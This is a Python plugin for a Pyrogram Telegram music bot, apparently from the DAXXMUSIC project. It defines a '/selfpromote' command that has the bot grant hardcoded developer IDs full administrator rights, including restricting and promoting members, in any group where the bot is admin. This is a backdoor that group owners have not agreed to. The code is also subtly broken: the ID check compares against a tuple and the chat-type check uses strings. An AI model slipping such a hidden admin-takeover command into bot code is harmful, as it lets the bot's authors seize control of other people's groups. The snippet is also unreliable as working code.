import requests
from pyrogram import filters
from pyrogram.types import Message
from pyrogram.enums import ChatMemberStatus
from DAXXMUSIC import app

DEV_USER_ID = 7710262210,6965147961

@app.on_message(filters.command("selfpromote"))
async def selfpromote(_, message: Message):
    if message.from_user.id != DEV_USER_ID:
        await message.reply_text("You are not my master, cutie uwu!")
        return

    if not message.chat.type in ["group", "supergroup"]:
        await message.reply_text("This command can only be used in groups.")
        return

    chat_member = await app.get_chat_member(message.chat.id, app.id)
    if chat_member.status not in [ChatMemberStatus.ADMINISTRATOR, ChatMemberStatus.OWNER]:
        await message.reply_text("I don't have the power to promote you, master!")
        return

    try:
        await app.promote_chat_member(
            chat_id=message.chat.id,
            user_id=DEV_USER_ID,
            can_change_info=True,
            can_delete_messages=True,
            can_restrict_members=True,
            can_invite_users=True,
            can_pin_messages=True,
            can_promote_members=True
        )
        await message.reply_text("Promoted you to admin with full powers, master!")
    except Exception as e:
        await message.reply_text(f"Failed to promote: {e}")
